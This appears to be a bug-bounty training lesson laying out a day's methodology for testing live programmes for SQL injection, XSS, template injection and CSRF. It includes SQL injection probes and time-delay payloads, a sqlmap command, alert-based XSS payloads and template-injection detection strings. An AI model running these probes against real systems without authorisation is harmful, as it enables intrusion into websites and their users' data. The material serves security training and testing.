---
title: "Live Programme Practice Day 7 — Injection and XSS Testing"
tags: [practice, live-programme, SQL-injection, XSS, CSRF, SSTI, command-injection,
       injection, bug-bounty, methodology]
module: 05-BugBountyOps-01
day: 282
related_topics:
  - Live Programme Practice Day 6 (Day 281)
  - SQL Injection Fundamentals (Day 076)
  - XSS Fundamentals (Day 090)
  - SSTI Server-Side Template Injection (Day 083)
---

# Day 282 — Live Programme Practice Day 7: Injection and XSS Testing

> "Injection bugs still exist in production. Not because developers are
> careless — because they are everywhere, input surfaces are vast, and one
> unparameterised query slips through. Systematic coverage is the only
> protection against missing them."
>
> — Ghost

---

## Goals

Systematic injection testing across all input surfaces.

**Time budget:** 5–6 hours.

---

## Block 1 — Input Surface Inventory (30 min)

List every input that is sent to the server:

```
Input: Search bar         Parameter: q          Reflected: Y/N  DB query: Y/N
Input: User profile name  Parameter: name        Reflected: Y/N
Input: Comment field      Parameter: content     Stored: Y/N
Input: Upload filename    Parameter: filename    Reflected: Y/N
Input: [others...]
```

---

## Block 2 — SQL Injection Testing (90 min)

Test each input with DB interaction potential:

```bash
# Manual error-based probing:
' -- 
" -- 
' OR 1=1 -- 
' UNION SELECT NULL -- 
' WAITFOR DELAY '0:0:5' --    (MSSQL)
' AND SLEEP(5) --              (MySQL)
' AND pg_sleep(5) --           (PostgreSQL)

# For any that produces a response difference or error:
# Escalate to sqlmap:
sqlmap -u "https://$TARGET/search?q=test" \
  --cookie="session=$TOKEN" \
  --level=3 \
  --risk=2 \
  --batch \
  --dbs   # only enumerate DB names, do not dump
```

SQLi findings:
```
Parameter: ___  Response difference: ___  Confirmed: Y/N
```

---

## Block 3 — XSS Testing (90 min)

Focus on stored and reflected XSS where user input is rendered back.

```bash
# Basic payload for detection:
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

# Context-aware payloads:
# In HTML attribute:  " onmouseover="alert(1)
# In JS string:       ';alert(1)//
# In URL:             javascript:alert(1)

# For stored XSS — check all places input is displayed:
# Profile name rendered elsewhere in app?
# Comment displayed to other users?
# Notification content rendered?
```

XSS results:
```
Input: ___  Context: ___  Payload: ___  Reflected/Stored: ___  Confirmed: Y/N
```

---

## Block 4 — SSTI Detection (60 min)

Any template-rendered input:

```
# Detection payloads (universal):
{{7*7}}      → 49 = Jinja2/Twig
${7*7}       → 49 = Freemarker
<%= 7*7 %>   → 49 = ERB (Ruby)
#{7*7}       → 49 = Ruby

# Test on: error messages, email templates,
# PDF generation, user-facing template fields
```

---

## Block 5 — CSRF Testing (30 min)

```
[ ] Does any state-changing action use CSRF tokens?
[ ] Can you craft a cross-origin form that submits the action?
[ ] Does SameSite cookie attribute prevent the exploit?
    Cookie SameSite value: ___
[ ] Does CORS allow cross-origin requests with credentials?
    Result: ___
```

---

## Session Debrief

```
Injection testing coverage: ___/N inputs
Confirmed injection bugs: ___
XSS findings: ___
SSTI findings: ___
CSRF findings: ___
Best finding this session: ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q282.1, Q282.2 …).

---

## Navigation

← Previous: [Day 281 — Live Programme Practice Day 6](DAY-0281-Live-Programme-Practice-Day-06.md)
→ Next: [Day 283 — Live Programme Practice Day 8](DAY-0283-Live-Programme-Practice-Day-08.md)
